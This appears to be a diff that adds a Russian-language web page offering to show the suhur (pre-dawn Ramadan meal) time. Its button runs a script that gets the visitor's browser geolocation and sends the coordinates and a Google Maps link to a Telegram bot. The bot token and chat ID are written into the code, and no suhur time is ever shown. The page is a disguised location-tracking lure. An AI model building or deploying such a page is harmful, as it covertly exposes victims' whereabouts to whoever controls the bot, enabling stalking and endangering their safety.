@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Время сухура</title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+
+<html lang="ru">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Геолокация</title>
+
+    <style>
+
+        body {
+
+            background-image: url('https://i.ibb.co/gbPpDFhg/IMG-20250302-170058-703.jpg'); /* Твой фон */
+
+            background-repeat: no-repeat;
+
+            background-position: center center;
+
+            background-size: contain; /* Подгоняет изображение без обрезки */
+
+            background-color: black; /* Цвет фона, если изображение меньше экрана */
+
+            height: 100vh;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            justify-content: center;
+
+            font-family: Arial, sans-serif;
+
+        }
+
+        button {
+
+            padding: 15px;
+
+            font-size: 18px;
+
+            border: none;
+
+            background-color: rgba(0, 0, 0, 0.7);
+
+            color: white;
+
+            cursor: pointer;
+
+            border-radius: 10px;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <button onclick="getLocation()">Узнать время Сухура</button>
+
+    <script>
+
+        const TELEGRAM_BOT_TOKEN = "7752183433:AAFy_IrScRXS2d1gqto7uk4nFUO0ISE11Cg";  // Замени на свой токен
+
+        const CHAT_ID = "7931089642";  // Замени на свой Chat ID
+
+        function getLocation() {
+
+            if (navigator.geolocation) {
+
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+
+            }
+
+        }
+
+        function sendLocation(position) {
+
+            let latitude = position.coords.latitude;
+
+            let longitude = position.coords.longitude;
+
+            // Отправка в Telegram
+
+            let message = `🌍 Новое местоположение:\nШирота: ${latitude}\nДолгота: ${longitude}\n[Открыть в Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;
+
+            let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(url)
+
+                .then(response => response.json())
+
+                .then(data => console.log("Отправлено в Telegram:", data))
+
+                .catch(error => console.error("Ошибка отправки в Telegram:", error));
+
+        }
+
+        function showError(error) {
+
+            console.error("Ошибка определения местоположения:", error);
+
+        }
+
+    </script>
+
+</body>
+
+</html>
+<!-- partial -->
+  
+</body>
+</html>
